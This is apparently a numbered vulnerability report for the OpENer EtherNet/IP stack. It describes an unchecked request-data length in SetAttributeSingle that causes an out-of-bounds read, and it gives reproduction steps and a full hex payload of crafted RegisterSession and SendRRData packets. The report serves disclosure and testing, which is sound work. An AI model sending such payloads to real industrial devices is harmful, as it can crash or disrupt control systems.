Number: 569

Summarize:
In OpENer current master branch, the real unconnected explicit-message path from `RegisterSession` through `SendRRData`/CPF to `SetAttributeSingle` reaches a settable attribute in the default build, but request-data length is not checked before `attribute->decode(...)` is invoked. A crafted request that passes path decoding triggers a server-side out-of-bounds read in the attribute decoder (`GetUintFromMessage` / `GetUsintFromMessage`), and ASan reports it as a stack-buffer-overflow read.

Reproduce:
Run the provided Python 3 PoC against the default POSIX OpENer server on `127.0.0.1:44818`. The script opens a socket, sends `RegisterSession`, extracts the session id from the reply, then sends `SendRRData` containing a `SetAttributeSingle` CIP message (`0x10`) in a Null Address / Unconnected Data Item CPF. Use the built-in `tcpip13` target for TCP/IP interface instance 1 attribute 13, or `qos8` for QoS instance 1 attribute 8; the crafted path is padded with `path_size_words=235`. Expected result: ASan reports a `stack-buffer-overflow` read in `GetUintFromMessage` / `GetUsintFromMessage`, with the trace passing through `DecodeCipTcpIpInterfaceEncapsulationInactivityTimeout` and `SetAttributeSingle`.

Payload:
65 00 04 00 00 00 00 00 00 00 00 00 41 42 43 44 45 46 47 48 00 00 00 00 01 00 00 00
6f 00 e8 01 01 00 00 00 00 00 00 00 41 42 43 44 45 46 47 48 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 b2 00 d8 01 10 eb 20 f5 24 01 30 0d 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00
6f 00 e8 01 01 00 00 00 00 00 00 00 41 42 43 44 45 46 47 48 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 b2 00 d8 01 10 eb 20 48 24 01 30 08 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00 28 00
